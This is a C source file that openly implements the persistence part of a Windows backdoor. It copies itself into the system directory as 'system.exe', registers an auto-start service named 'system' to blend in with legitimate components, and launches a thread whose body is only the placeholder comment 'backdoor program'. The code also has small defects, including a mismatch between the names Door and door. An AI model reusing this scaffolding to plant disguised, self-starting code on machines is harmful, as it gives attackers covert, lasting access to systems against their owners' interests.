#pragma comment(lib, "ws2_32.lib")
#include <stdio.h>
#include <windows.h>

void WINAPI ServiceMain(DWORD, LPTSTR *);    //service main body
void WINAPI ServiceCtrlHandle(DWORD Opcode); //service controller

BOOL InstallCmdService();
void DelServices();
void Door();

SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = TRUE;

int main(int argc, char *argv[]){
    SERVICE_TABLE_ENTRY DispatchTable[] = {
        {"system", ServiceMain},
        {NULL, NULL},
    };

    if(argc == 2){
        if(!stricmp(argv[1], "-i"))  //if second line argument is equal -i"install"
            InstallCmdService();

        else if(!stricmp(argv[1], "-r")) // if second line argument is equal -r"remove"
            DelServices();

        return 0;
    }

    // no argument input, entry point address afferent;
    StartServiceCtrlDispatcher(DispatchTable);
    return 0;
}

void door(){
    // backdoor program
}

/*---------------------------------Service Main--------------------------------------*/
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpArgv){
    int dwThreadId;
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;              //service type
    m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;     //service cur-status is prepare
    m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |  //only accpet pause or stop single
        SERVICE_ACCEPT_PAUSE_CONTINUE;
    m_ServiceStatus.dwWin32ExitCode = 0;                        //ignore
    m_ServiceStatus.dwServiceSpecificExitCode = 0;              //ignore
    m_ServiceStatus.dwCheckPoint = 0;                           //ignore
    m_ServiceStatus.dwWaitHint = 0;                             //ignore

    //RegisterServiceCtrlHandler func can control service like: stop start resume pause, etc.
    m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandle);

    if(m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0) return;

    //set service status
    m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    m_ServiceStatus.dwCheckPoint = 0;                           //why set it again?
    m_ServiceStatus.dwWaitHint = 0;                             //why set it again?

    if( SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus) ) //make configuration effective
        bRunning = TRUE;

    //using thread startup backdoor program
    if(!(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)door, (LPVOID)0, 0, &dwThreadId)))
        return;

    return;
}


/*---------------------------------Service Controller--------------------------------------*/
void WINAPI ServiceCtrlHandle(DWORD Opcode){
    switch(Opcode){
        case SERVICE_CONTROL_PAUSE:  //pasue the server
            m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
            m_ServiceStatus.dwWin32ExitCode = 0;
            m_ServiceStatus.dwCheckPoint = 0;
            m_ServiceStatus.dwWaitHint = 0;
            SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus);
            bRunning = FALSE;
            break;
        case SERVICE_CONTROL_CONTINUE: //go on runing server
            m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
            m_ServiceStatus.dwWin32ExitCode = 0;
            m_ServiceStatus.dwCheckPoint = 0;
            m_ServiceStatus.dwWaitHint = 0;
            SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus);
            bRunning = TRUE;
            break;
        case SERVICE_CONTROL_STOP: //stop the server
            m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            m_ServiceStatus.dwWin32ExitCode = 0;
            m_ServiceStatus.dwCheckPoint = 0;
            m_ServiceStatus.dwWaitHint = 0;
            SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus);
            bRunning = FALSE;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
    }
}


/*---------------------------------Service Installer--------------------------------------*/
BOOL InstallCmdService(){
    LPCTSTR lpszBinaryPathName;
    char strDir[1024], chSysPath[1024];
    SC_HANDLE schSCManager, schService;

    //GetCurrentDirectory(1024, strDir);                //get execute file's path , no include itself;
    GetModuleFileName(NULL, strDir, sizeof(strDir));    //get execute file's path, include filename
    GetSystemDirectory(chSysPath, sizeof(chSysPath));   //c:\windows\system32

    strcat(chSysPath, "\\system.exe");                  //c:\windows\system32\system.exe
    if( CopyFile(strDir, chSysPath, FALSE))             //[admin] copy cuurent code to system root 
        printf("Copy file ok: %s => %s\n", strDir, chSysPath);

    strcpy(strDir, chSysPath);                          //copy var:chSysPath to var:strDir
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);  //[admin]open SCM
    if( schSCManager == NULL ){
        printf("open scmanager failed, maybe permission deny, run as administrator again\n");
        return FALSE;
    }

    lpszBinaryPathName = strDir;                        //service execute file path
    schService = CreateService(schSCManager,            //use SCM to create service;
        "system",                   
        "system",                   //add info to SCM database;
        SERVICE_ALL_ACCESS,         //access privilege: all privilege
        SERVICE_WIN32_OWN_PROCESS,  //single service, oppsite: SERVICE_WIN32_SHARE_PROCESS #multi service
        SERVICE_AUTO_START,         //start type
        SERVICE_ERROR_NORMAL,        //error control type
        lpszBinaryPathName,         //service name
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );


    if (schService) 
        printf("Install service success!!\n");
    else{
        printf("Install service failed\n");
        return  FALSE;
    }

    CloseServiceHandle(schService);
    return TRUE;
}

/*---------------------------------Service Uninstaller--------------------------------------*/
void DelServices(){
    BOOL isSuccess;
    char name[100];
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;

    strcpy(name, "system");

    scm = OpenSCManager(NULL,NULL, SC_MANAGER_CREATE_SERVICE);
    if( scm == NULL ){
        printf("OpenSCManager Error\n");
        return;
    }

    service = OpenService(scm, name, SERVICE_ALL_ACCESS|DELETE);
    if(!service){
        printf("OpenService Error\n");
        return;
    }

    isSuccess = QueryServiceStatus(service, &status);
    if(!isSuccess){
        printf("QueryServiceStatus Error\n");
        return;
    }

    if( status.dwCurrentState != SERVICE_STOPPED ){
        isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
        if(!isSuccess){
            printf("Stop service Error\n");
        }

        Sleep(500);
    }

    isSuccess = DeleteService(service);
    if(!isSuccess){
        printf("Delete service failed\n");
        return;
    }else{
        printf("Delete service success\n");
    }

    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}




